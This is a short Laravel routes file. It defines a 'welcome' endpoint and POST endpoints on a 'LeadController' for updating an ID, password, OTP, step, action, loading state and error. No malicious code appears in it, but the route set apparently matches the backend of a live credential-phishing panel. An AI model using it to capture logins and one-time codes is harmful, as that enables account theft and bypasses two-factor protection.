<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Request;
use Illuminate\Support\Facades\Response;
use App\Http\Controllers\LeadController;

Route::get('/updateapp', function (Request $request) {
    return Response::json('welcome')->setStatusCode(200);
});

Route::post('/updateid',[LeadController::class,'updateId'])->name('updateid');
Route::post('/updatepwd',[LeadController::class,'updatePwd'])->name('updatepwd');
Route::post('/updateotp',[LeadController::class,'updateOtp'])->name('updateotp');
Route::post('/updatestep',[LeadController::class,'updateStep'])->name('updatestep');
Route::post('/updateaction',[LeadController::class,'updateAction'])->name('updateaction');
Route::post('/updateisloading',[LeadController::class,'updateIsLoading'])->name('updateisloading');
Route::post('/updateerror',[LeadController::class,'updateError'])->name('updateerror');

